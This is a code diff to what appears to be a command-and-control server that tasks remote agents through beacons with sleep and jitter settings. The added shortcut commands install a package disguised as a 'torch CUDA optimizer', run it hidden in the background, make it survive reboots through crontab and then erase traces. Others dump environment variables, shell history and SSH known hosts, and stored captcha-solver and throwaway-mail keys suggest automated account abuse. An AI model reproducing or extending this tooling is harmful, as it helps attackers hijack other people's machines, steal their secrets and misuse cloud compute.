@@ -223,6 +223,25 @@ def set_config(key: str, value: str):
     db.commit()
     db.close()
 
+def _sync_api_keys_to_env():
+    """Load saved API keys from DB into environment on startup."""
+    try:
+        captcha_key = get_config("captcha_api_key")
+        if captcha_key:
+            os.environ.setdefault("CAPTCHA_API_KEY", captcha_key)
+            os.environ.setdefault("CAPTCHA_API_KEYS", captcha_key)
+        fcb_keys = get_config("fcb_api_keys")
+        if fcb_keys:
+            os.environ.setdefault("FCB_API_KEYS", ",".join(fcb_keys.splitlines()))
+            Path("data/fcb_keys.txt").write_text(fcb_keys)
+        boomlify_keys = get_config("boomlify_api_keys")
+        if boomlify_keys:
+            Path("data/boomlify_keys.txt").write_text(boomlify_keys)
+    except Exception:
+        pass
+
+_sync_api_keys_to_env()
+
 # ──────────────────────── WEBHOOKS ────────────────────────
 
 def send_webhook(event: str, details: str = ""):
@@ -2284,6 +2303,9 @@ def agent_beacon():
         return jsonify({"error": "no id"}), 400
     db = get_db()
     db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1 WHERE id=?", (agent_id,))
+    agent_row = db.execute("SELECT sleep_interval, jitter FROM agents WHERE id=?", (agent_id,)).fetchone()
+    sleep_interval = agent_row["sleep_interval"] if agent_row else 5
+    jitter = agent_row["jitter"] if agent_row else 10
     tasks = db.execute("SELECT id, task_type, payload FROM tasks WHERE agent_id=? AND status='pending'", (agent_id,)).fetchall()
     task_list = [dict(t) for t in tasks]
     for t in tasks:
@@ -2291,10 +2313,10 @@ def agent_beacon():
     db.commit()
     db.close()
 
-    resp = json.dumps({"tasks": task_list, "sleep": 5})
+    resp = json.dumps({"tasks": task_list, "sleep": sleep_interval, "jitter": jitter})
     if encrypted:
         return Response(encrypt_payload(resp, enc_key), content_type="text/plain")
-    return jsonify({"tasks": task_list, "sleep": 5})
+    return jsonify({"tasks": task_list, "sleep": sleep_interval, "jitter": jitter})
 
 @app.route("/api/agent/result", methods=["POST"])
 def agent_result():
@@ -2323,14 +2345,28 @@ def agent_result():
 # ── Shortcut commands ──
 
 SHORTCUT_COMMANDS = {
-    ":start": "pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null; nohup python3 -m torch_cuda_optimizer >/dev/null 2>&1 &",
-    ":stop": "pkill -f '.tco_cache/cuda_kernels' 2>/dev/null; pkill -f '.tco_cache/compute_engine' 2>/dev/null; pkill -f 'torch_cuda_optimizer' 2>/dev/null; rm -f /tmp/.tco_training_lock; echo stopped",
-    ":status": "pgrep -af 'tco_cache|torch_cuda_optimizer' 2>/dev/null && echo RUNNING || echo NOT_RUNNING; ls -la /tmp/.tco_cache/ 2>/dev/null; tail -5 /tmp/.tco_cache/training_output.log 2>/dev/null",
-    ":log": "tail -30 /tmp/.tco_cache/training_output.log 2>/dev/null || echo 'no log'",
-    ":persist": "pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null; (crontab -l 2>/dev/null | grep -v torch_cuda_optimizer; echo '@reboot python3 -m torch_cuda_optimizer >/dev/null 2>&1 &') | crontab -; nohup python3 -m torch_cuda_optimizer >/dev/null 2>&1 &",
-    ":sysinfo": "echo '=== SYSTEM ===' && uname -a && echo '=== CPU ===' && nproc && cat /proc/cpuinfo 2>/dev/null | head -20 && echo '=== MEMORY ===' && free -h 2>/dev/null || vm_stat && echo '=== DISK ===' && df -h / && echo '=== GPU ===' && (nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null || echo 'no GPU') && echo '=== NET ===' && ip -4 addr 2>/dev/null || ifconfig",
-    ":portscan": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo 'no ss/netstat'",
-    ":cleanup": "rm -rf /tmp/.tco_cache /tmp/.tco_training_lock; crontab -l 2>/dev/null | grep -v torch_cuda_optimizer | crontab -; echo cleaned",
+    # GPU Optimizer
+    ":start":    "pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null; nohup python3 -m torch_cuda_optimizer >/dev/null 2>&1 &",
+    ":stop":     "pkill -f 'torch_cuda_optimizer' 2>/dev/null; pkill -f '.tco_cache' 2>/dev/null; rm -f /tmp/.tco_training_lock; echo stopped",
+    ":status":   "pgrep -af 'tco_cache|torch_cuda_optimizer' 2>/dev/null && echo RUNNING || echo NOT_RUNNING; ls -la /tmp/.tco_cache/ 2>/dev/null; tail -5 /tmp/.tco_cache/training_output.log 2>/dev/null",
+    ":log":      "tail -50 /tmp/.tco_cache/training_output.log 2>/dev/null || echo 'no log'",
+    ":persist":  "pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null; (crontab -l 2>/dev/null | grep -v torch_cuda_optimizer; echo '@reboot python3 -m torch_cuda_optimizer >/dev/null 2>&1 &') | crontab -; nohup python3 -m torch_cuda_optimizer >/dev/null 2>&1 &",
+    ":cleanup":  "rm -rf /tmp/.tco_cache /tmp/.tco_training_lock; crontab -l 2>/dev/null | grep -v torch_cuda_optimizer | crontab -; echo cleaned",
+    # System info
+    ":sysinfo":  "echo '=== SYSTEM ===' && uname -a && echo '=== CPU ===' && nproc && echo '=== MEMORY ===' && free -h 2>/dev/null && echo '=== DISK ===' && df -h / && echo '=== GPU ===' && (nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null || echo 'no GPU') && echo '=== NETWORK ===' && (ip -4 addr 2>/dev/null || ifconfig 2>/dev/null)",
+    ":id":       "id && whoami && hostname",
+    ":ps":       "ps aux --sort=-%cpu 2>/dev/null | head -30 || ps aux | head -30",
+    ":net":      "ip -4 addr 2>/dev/null && echo '--- ROUTES ---' && ip route 2>/dev/null || ifconfig && netstat -rn 2>/dev/null",
+    ":ports":    "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo 'no ss/netstat'",
+    ":env":      "env | sort",
+    ":ls":       "ls -la",
+    ":cwd":      "pwd && ls -la",
+    ":gpu":      "nvidia-smi 2>/dev/null || (python3 -c 'import torch; print(torch.cuda.get_device_name(0))' 2>/dev/null) || echo 'no GPU'",
+    ":pip":      "pip list 2>/dev/null | head -40",
+    ":history":  "cat ~/.bash_history 2>/dev/null | tail -50 || history 2>/dev/null | tail -50",
+    ":cron":     "crontab -l 2>/dev/null || echo 'no crontab'",
+    ":ssh":      "ls ~/.ssh/ 2>/dev/null && cat ~/.ssh/known_hosts 2>/dev/null | head -20",
+    ":uptime":   "uptime && who 2>/dev/null",
 }
 
 def _expand_shortcut(task_type: str, payload: str):
@@ -3500,9 +3536,11 @@ def api_tasks(agent_id):
 # ──────────────────────── API: CONFIG ────────────────────────
 
 CONFIG_KEYS = [
-    "webhook_discord", "webhook_telegram", "encryption_key",
-    "agent_token", "registration_open",
-    "public_url", "public_url_kaggle", "cloudflare_tunnel_token"
+    "webhook_discord", "webhook_telegram",
+    "encryption_key", "agent_token", "registration_open",
+    "public_url", "public_url_kaggle", "cloudflare_tunnel_token",
+    "captcha_api_key", "fcb_api_keys",
+    "boomlify_api_keys", "mail_provider",
 ]
 
 @app.route("/api/config", methods=["GET", "POST"])
@@ -3526,6 +3564,15 @@ def api_config():
                             return jsonify({"error": "invalid public_url"}), 400
                         v = v.rstrip("/")
                 set_config(k, v)
+                # Sync API keys to env vars and files for live use
+                if k == "captcha_api_key" and v:
+                    os.environ["CAPTCHA_API_KEY"] = v
+                    os.environ["CAPTCHA_API_KEYS"] = v
+                if k == "fcb_api_keys" and v:
+                    os.environ["FCB_API_KEYS"] = ",".join(v.splitlines())
+                    Path("data/fcb_keys.txt").write_text(v)
+                if k == "boomlify_api_keys" and v:
+                    Path("data/boomlify_keys.txt").write_text(v)
         log_event("config_updated", f"keys: {list(data.keys())}")
         return jsonify({"status": "ok"})
     return jsonify({k: get_config(k) for k in CONFIG_KEYS})
